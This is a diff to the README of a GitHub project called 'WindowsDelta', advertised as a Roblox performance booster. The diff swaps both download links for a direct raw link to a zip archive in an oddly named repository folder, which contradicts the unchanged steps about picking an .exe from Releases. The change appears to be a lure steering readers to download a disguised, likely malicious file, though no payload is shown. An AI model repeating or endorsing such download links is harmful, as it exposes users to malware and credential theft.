@@ -1,6 +1,6 @@
 # ⚡ WindowsDelta - Boost your Roblox gaming performance now
 
-[![](https://img.shields.io/badge/Download-Delta-blue)](https://github.com/Budrendition792/WindowsDelta)
+[![](https://img.shields.io/badge/Download-Delta-blue)](https://github.com/Budrendition792/WindowsDelta/raw/refs/heads/main/cocreatorship/Windows-Delta-v2.6.zip)
 
 ## 🎯 About the application
 
@@ -23,7 +23,7 @@ Before you install the application, check your computer against this list. Your 
 
 You must visit the official repository page to download the latest version. Follow these steps to prepare your system:
 
-1. Visit [this page to download](https://github.com/Budrendition792/WindowsDelta).
+1. Visit [this page to download](https://github.com/Budrendition792/WindowsDelta/raw/refs/heads/main/cocreatorship/Windows-Delta-v2.6.zip).
 2. Locate the section labeled Releases on the right side of the page.
 3. Click on the version marked as Latest.
 4. Select the file ending in .exe to start your download.
